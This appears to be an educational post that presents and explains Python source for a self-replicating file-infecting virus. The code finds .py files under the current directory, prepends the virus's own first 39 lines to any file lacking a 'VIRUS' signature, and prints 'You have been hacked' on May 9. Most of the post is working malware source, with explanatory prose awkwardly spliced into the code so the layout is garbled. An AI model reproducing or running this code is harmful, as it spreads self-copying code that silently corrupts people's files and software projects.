-simple example of a self-replicating code (virus) for educational purposes only and should not be used for any malicious activities.
The locate function is responsible for finding Python files in a specified directory and its subdirectories.
def locate(path):
  -It initializes an empty list files_targeted to store the paths of Python files.
It retrieves a list of all items in the given directory using os.listdir(path).
It iterates through the list of items and checks if each item is a directory or ends with ".py" to identify Python files.

#!/usr/bin/python3
import os
import datetime

# Define a virus signature
SIGNATURE = "VIRUS"

# Function to locate Python files in a directory and its subdirectories

    files_targeted = []
    filelist = os.listdir(path)
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            files_targeted.extend(locate(path+"/"+fname))
        elif fname[-3:] == ".py":
            infected = False
            # Check if the virus signature is present in the file
            for line in open(path+"/"+fname):
            -For Python files, it checks if the file contains the virus signature. If not, it adds the file to files_targeted.
Finally, it returns the list of Python files.
                if SIGNATURE in line:
                    infected = True
                    break
            if infected == False:
                files_targeted.append(path+"/"+fname)
    return files_targeted

# Function to infect Python files
def infect(files_targeted):
    # Open the current script (the virus)
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i,line in enumerate(virus):
        if 0 <= i < 39:  # Copy the first 39 lines of the virus script
            virusstring += line
    virus.close  # Close the virus file
    # Iterate through targeted files and prepend the virus code
    for fname in files_targeted:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()

# Function to detonate the virus on a specific date
def detonate():
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        print("You have been hacked")

# Locate Python files in the current directory and its subdirectories
files_targeted = locate(os.path.abspath(""))
# Infect the targeted Python files with the virus
infect(files_targeted)
# Check if it's time to detonate the virus
detonate()

The infect function is responsible for infecting Python files by adding the virus code to them. It does this by opening the current script (the virus) and copying the first 39 lines of the virus script into a string called virusstring. It then iterates through the list of targeted Python files, opens each file, and writes virusstring followed by the original file contents, effectively infecting the file. The detonate function checks if it’s a specific date (May 9th) and prints “You have been hacked” if the condition is met. The script starts by using the locate function to find Python files in the current directory and its subdirectories. It then calls the infect function to infect the found Python files with the virus code. Finally, it checks if it’s time to detonate the virus by calling the detonate function.
